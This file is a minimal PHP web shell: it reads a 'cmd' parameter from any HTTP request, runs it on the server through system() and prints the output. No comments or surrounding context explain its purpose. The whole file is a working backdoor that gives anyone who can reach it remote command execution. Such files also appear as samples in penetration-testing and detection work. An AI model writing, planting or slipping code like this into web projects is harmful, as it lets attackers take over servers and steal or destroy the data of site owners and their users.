<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    $out= system($cmd);
    echo $out;
    echo "</pre>";
}
?>

